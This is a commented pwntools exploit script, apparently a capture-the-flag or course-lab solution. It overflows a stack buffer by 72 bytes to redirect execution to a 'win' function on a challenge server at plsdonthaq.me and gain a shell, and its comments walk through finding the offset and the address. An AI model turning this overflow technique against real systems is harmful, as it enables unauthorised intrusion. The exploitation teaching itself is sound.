#!/usr/bin/env python3
from pwn import *

# Before creating the script:
# To begin, we use pwndbg's cyclic 100 command to generate an input sequence for our buffer overflow.

# Then, when the function tries to return, the EIP register (which holds the return address)
# is invalid, so pwndbg states 'Invalid address 0x61616173'.

# To determine what offset this value 0x61616173 is within our sequence, we use the command cyclic -l 0x61616173,
# which gives us 72. 

# Hence, we need 72 bytes of anything followed by the address of the function we want to 
# return to once the current function is complete (instead of simply returning back to main)

# To determine the address of the 'win' function we want to jump to, I opened the binary
# in binary ninja, selected the 'win' function from the list of symbols, and then on
# the bottom right of the screen it gives the address of this function as 0x80484d6

# The script:
p = remote("plsdonthaq.me", 2002)

# We simply send a byte string where the first 72 characters are anything, and then
# the address of the 'win' function that we want to return to
p.sendline(flat({
  72: p32(0x80484d6)
  }))

# we then have access to the shell
p.interactive()